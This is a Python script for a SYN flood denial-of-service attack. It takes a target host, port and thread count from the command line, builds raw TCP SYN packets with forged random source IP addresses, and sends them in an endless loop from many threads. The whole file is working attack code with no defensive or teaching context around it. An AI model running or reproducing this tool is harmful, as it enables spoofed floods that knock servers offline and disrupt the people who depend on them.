import socket, threading, sys, random, struct

# Check if the input is a domain or an IP
def resolve_ip(target):
    try:
        ip_address = socket.gethostbyname(target)
        return ip_address
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for {target}")
        sys.exit()

# Calculate the checksum for the packet (required for TCP/IP headers)
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

# Craft the SYN packet
def syn_packet(source_ip, dest_ip, dest_port):
    # IP header fields
    ip_ihl = 5  # IP Header Length
    ip_ver = 4  # IP Version
    ip_tos = 0  # Type of Service
    ip_tot_len = 0  # Total length (kernel will fill)
    ip_id = random.randint(10000, 65535)  # Identification
    ip_frag_off = 0  # Fragment offset
    ip_ttl = 255  # Time to Live
    ip_proto = socket.IPPROTO_TCP  # Protocol (TCP)
    ip_check = 0  # Checksum (kernel will fill)
    ip_saddr = socket.inet_aton(source_ip)  # Source IP
    ip_daddr = socket.inet_aton(dest_ip)  # Destination IP

    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    # TCP header fields
    tcp_source = random.randint(1024, 65535)  # Random source port
    tcp_seq = 0  # Sequence number
    tcp_ack_seq = 0  # Acknowledgment number
    tcp_doff = 5  # Data offset (header size)
    tcp_flags = 2  # SYN flag set (SYN = 2)
    tcp_window = socket.htons(5840)  # Maximum allowed window size
    tcp_check = 0  # Checksum (we will calculate this)
    tcp_urg_ptr = 0  # Urgent pointer (not used)
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    # Pseudo-header fields for checksum calculation
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    pseudo_header = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = pseudo_header + tcp_header
    tcp_check = checksum(psh)
    
    # Rebuild the TCP header with the correct checksum
    tcp_header = struct.pack('!HHLLBBH', tcp_source, dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    
    # Full packet
    packet = ip_header + tcp_header
    return packet

# Main SYN flood function
def syn_flood():
    while True:
        try:
            # Create a raw socket (requires root/admin privileges)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            # Craft and send SYN packets continuously
            source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = syn_packet(source_ip, ip, port)
            s.sendto(packet, (ip, 0))  # Send packet to the target IP
            print(f"[!] SYN Attack Sent from {source_ip} to {ip}:{port}")
        except Exception as e:
            print(f"Error: {str(e)}")
            break

# Accepts a domain name or an IP address
target = str(sys.argv[1])
ip = resolve_ip(target)
port = int(sys.argv[2])
threads = int(sys.argv[3])

# Start the attack with multiple threads
for y in range(threads):
    th = threading.Thread(target=syn_flood)
    th.start()
